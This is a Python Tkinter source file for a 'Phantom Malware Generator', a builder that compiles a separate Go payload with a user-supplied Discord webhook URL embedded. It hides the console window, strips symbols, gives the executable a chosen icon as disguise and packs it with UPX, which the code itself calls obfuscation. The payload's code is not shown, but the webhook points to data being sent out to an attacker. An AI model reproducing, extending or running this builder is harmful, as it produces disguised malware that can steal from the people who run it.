import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import os
import subprocess
import sys
from resource_injector import inject_icon

class Phantom:
    def __init__(self, root):
        self.root = root
        self.root.title("Phantom Malware Generator")
        self.root.geometry("500x450")
        self.root.configure(bg="#2c3e50")
        
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TLabel", background="#2c3e50", foreground="#ecf0f1", font=("Segoe UI", 10))
        style.configure("TButton", font=("Segoe UI", 10, "bold"))
        style.configure("Header.TLabel", font=("Segoe UI", 16, "bold"), foreground="#3498db")
        
        # Initialize attributes
        self.destination = None
        self.icon_path = None
        self.go_executable = self._find_go_executable()

        # Main Container
        main_frame = ttk.Frame(root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header
        header = ttk.Label(main_frame, text="PHANTOM GENERATOR", style="Header.TLabel")
        header.pack(pady=(0, 20))

        # Webhook URL
        ttk.Label(main_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        self.url_entry = ttk.Entry(main_frame, width=60)
        self.url_entry.pack(fill=tk.X, pady=(0, 10))

        # EXE Name
        ttk.Label(main_frame, text="Output EXE Name:").pack(anchor=tk.W)
        self.exe_entry = ttk.Entry(main_frame, width=60)
        self.exe_entry.insert(0, "payload.exe")
        self.exe_entry.pack(fill=tk.X, pady=(0, 10))

        # Buttons Frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=10)

        self.destination_button = ttk.Button(btn_frame, text="📁 Select Folder", command=self.select_destination)
        self.destination_button.pack(side=tk.LEFT, padx=(0, 10))

        self.icon_button = ttk.Button(btn_frame, text="🖼️ Select Icon", command=self.select_icon)
        self.icon_button.pack(side=tk.LEFT)

        # Status Labels
        self.dest_label = ttk.Label(main_frame, text="No folder selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.dest_label.pack(anchor=tk.W)
        
        self.icon_label = ttk.Label(main_frame, text="No icon selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.icon_label.pack(anchor=tk.W)

        # Generate Button
        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PAYLOAD", command=self.generate_malware)
        self.generate_button.pack(fill=tk.X, pady=20)

        # Progress
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X, pady=(10, 5))
        
        self.status_label = ttk.Label(main_frame, text="Ready", font=("Segoe UI", 9, "italic"))
        self.status_label.pack()
    
    def _find_go_executable(self):
        """Find the Go executable in the system"""
        # Try common locations
        possible_paths = [
            "C:\\Program Files\\Go\\bin\\go.exe",
            "C:\\go\\bin\\go.exe",
            "go.exe"  # Try from PATH
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # If not found, try to find it in PATH
        try:
            result = subprocess.run(["where", "go.exe"], capture_output=True, text=True, check=True)
            return result.stdout.strip().split('\n')[0]
        except:
            return None

    def select_destination(self):
        self.destination = filedialog.askdirectory()
        if self.destination:
            self.dest_label.config(text=f"Folder: {os.path.basename(self.destination)}")

    def select_icon(self):
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            self.icon_label.config(text=f"Icon: {os.path.basename(self.icon_path)}")

    def generate_malware(self):
        url = self.url_entry.get()
        exe_name = self.exe_entry.get()
        
        if not url or not exe_name or not self.destination:
            messagebox.showerror("Error", "Required fields: Webhook URL, EXE Name, and Destination Folder")
            return
        
        if not self.go_executable:
            messagebox.showerror("Error", "Go executable not found. Please install Go.")
            return
        
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
        
        try:
            self.status_label.config(text="Initializing...")
            self.progress_var.set(10)
            self.root.update()
            
            # Get the directory where phantom.py is located
            script_dir = os.path.dirname(os.path.abspath(__file__))
            go_payload_dir = os.path.join(script_dir, "go_payload")
            output_exe = os.path.join(self.destination, exe_name)
            
            # Verify Go payload exists
            if not os.path.exists(os.path.join(go_payload_dir, "main.go")):
                messagebox.showerror("Error", f"Go payload not found at {go_payload_dir}")
                return
            
            self.status_label.config(text="Compiling Go payload...")
            self.progress_var.set(30)
            self.root.update()
            
            # Compile Go code
            timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            ldflags = f"-s -w -H=windowsgui -X main.WebhookURL={url} -X \"main.Timestamp={timestamp}\""
            
            build_cmd = [
                self.go_executable, 
                "build",
                "-o", output_exe,
                "-ldflags", ldflags,
                os.path.join(go_payload_dir, "main.go")
            ]
            
            result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                 capture_output=True, text=True)
            
            self.status_label.config(text="Injecting icon...")
            self.progress_var.set(60)
            self.root.update()
            
            # Inject icon
            if self.icon_path:
                try:
                    inject_icon(output_exe, self.icon_path)
                except Exception as icon_err:
                    print(f"Warning: Icon injection failed: {icon_err}")
            
            self.status_label.config(text="Compressing with UPX...")
            self.progress_var.set(80)
            self.root.update()
            
            # Obfuscate binary with UPX
            upx_cmd = ["upx", "-9", output_exe]
            try:
                subprocess.run(upx_cmd, check=True, capture_output=True, text=True)
            except FileNotFoundError:
                print("UPX not found - skipping compression")
            except Exception as upx_err:
                print(f"Warning: UPX compression failed: {upx_err}")
            
            self.status_label.config(text="Success!")
            self.progress_var.set(100)
            self.root.update()
            
            messagebox.showinfo("Success", f"Payload generated successfully at:\n{output_exe}")
            self.status_label.config(text="Ready")
            self.progress_var.set(0)
        
        except subprocess.CalledProcessError as e:
            self.status_label.config(text="Build Failed")
            messagebox.showerror("Error", f"Build failed:\n{e.stderr if e.stderr else str(e)}")
        except Exception as e:
            self.status_label.config(text="Error occurred")
            messagebox.showerror("Error", f"An error occurred:\n{str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = Phantom(root)
    root.mainloop()
